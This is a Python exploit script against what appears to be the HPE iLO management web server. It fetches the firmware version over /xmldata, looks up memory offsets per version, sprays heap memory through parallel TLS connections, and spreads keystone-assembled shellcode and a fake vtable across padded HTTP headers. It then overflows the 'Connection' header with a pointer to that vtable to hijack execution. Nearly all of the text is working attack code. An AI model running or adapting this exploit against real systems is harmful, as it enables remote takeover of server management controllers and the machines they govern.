#!/usr/bin/env python3

import socket
import ssl
import sys
from struct import pack,unpack_from

from keystone import *
from exploit_offsets import *

import threading
from time import sleep

sc_offset = 0x1000
vtable_offset = 0x100

def asm_sc(sc):
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    return ''.join(chr(x) for x in ks.asm(sc)[0])

def asm_sc_x86(sc):
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    ks.syntax = KS_OPT_SYNTAX_NASM
    return ''.join(chr(x) for x in ks.asm(sc)[0])

def get_version_info(version):
    if version not in EXP_OFFSETS:
        print("Unknown version %s, try 210, 244, 250..." % version)
        sys.exit(1)
    return EXP_OFFSETS[version]

def ssl_connector(addr, port):
    print("[*] Connecting to %s..." % addr)

    sraw = socket.socket()
    s = ssl.wrap_socket(sraw)
    s.connect((addr, port))

    print("[+] Connected")
    return s

def check_shellcode(bin_sc):
    assert("\x0a" not in bin_sc)
    assert("\x0d" not in bin_sc)
    assert(len(bin_sc) < 0x2000)

def get_sc_headers(bin_sc):
    print("[*] Preparing shellcode headers...")
    sc_headers = ""
    off=0

    while off != -1:
        off = bin_sc.rfind("\x00")
        sc_part = bin_sc[off+1:]
    
        sc_header = "HeaderSC%04x: " % (off & 0xffff)
        sc_header += "A" * (sc_offset - len(sc_header))
        sc_header += "B" * (off+1)
        sc_header += sc_part
        sc_header += "\r\n"

        sc_headers += sc_header
        bin_sc = bin_sc[:off]
    return sc_headers

def get_flush_headers():
    flush_header = "Flusher: "
    flush_header += "X" * ((sc_offset - 4) - len(flush_header))
    flush_header += "\r\n"

    return flush_header

def get_vtable_headers(o):
    print("[*] Preparing fake vtable...")

    fake_vtable = o["vtable"]
    fake_vtable[7] = o["wbuff_addr"] + sc_offset

    print("[*] Preparing fake vtable headers...")

    vtable_headers = ""
    for k in range(len(fake_vtable)-1,-1,-1):
        if fake_vtable[k] == 0:
            continue
        fheader = "Header%08d: " % k
        fheader += "A" * (vtable_offset - len(fheader))
        fheader += "B" * k * 4
        fheader += pack("<L", fake_vtable[k])
        fheader = fheader.rstrip("\x00")
        fheader += "\r\n"
        
        vtable_headers += fheader
    return vtable_headers

def get_cookies_headers():
    cookies_headers = "Cookie: "
    for k in range(128):
        cookies_headers += "cookie%02x=value%02x;" % (k,k)
    cookies_headers += "\r\n"
    return cookies_headers

def get_xml_version(s, headers):
    print("[*] Preparing XML request...")
    
    buf  = "GET /xmldata?item=all HTTP/1.1\r\n"
    buf += "Host: ilo\r\n"

    buf += headers
    buf += "\r\n"

    print("[*] Sending %x bytes..." % len(buf))
    s.send(buf)
    print("[+] Request XML sent")
    
    a = s.recv(1024)
    while "</RIMP>" not in a:
        a += s.recv(1024)
    while "0\r\n\r\n" not in a:
        a += s.recv(1024)
    
    print("[*] XML data retrieved")
    
    ilo_version = a.split("FWRI")[1][1:-2]

    print("[*] Found iLO version %s" % ilo_version)
    return ilo_version

def fill_threads(host, headers):
    th = []
    for i in range(3):
        th.append(fillingThread(host, headers))
    for i in range(3):
        th[i].start()
    while not all(th[i].sentflag for i in range(3)):
        sleep(0.1)
    return th

def stop_threads(ths):
    for th in ths:
        th.stop()

class fillingThread(threading.Thread):
    def __init__(self, host, headers): 
        threading.Thread.__init__(self)
        self.stopflag = False
        try:
            self.s = ssl_connector(host, 443)
        except:
            self.s = None
        self.headers = headers
        self.sentflag = False

    def run(self):
        if self.s is None:
            return
        print("[*] Filling buffer...")

        self.buf  = "GET / HTTP/1.1\r\n"
        self.buf += "Host: ilo\r\n"

        self.buf += self.headers

        self.s.send(self.buf)
        self.sentflag = True

        while not self.stopflag:
            sleep(0.1)
        print("[+] Releasing threads")
        self.s.close()

    def stop(self):
        self.stopflag = True

def send_exploit(s, headers, o):
    print("[*] Preparing request 2...")
    
    buf  = "GET / HTTP/1.1\r\n"
    buf += "Host: ilo\r\n"

    buf += headers

    buf += "Connection: "
    buf += "A" * (0xb8-0xc)
    buf += pack("<L", o["wbuff_addr"] + vtable_offset) # pointer to fake vtable
    buf += "\r\n"

    print("[*] Sending %x bytes..." % len(buf))
    s.send(buf)

    print("[+] Request 2 sent")

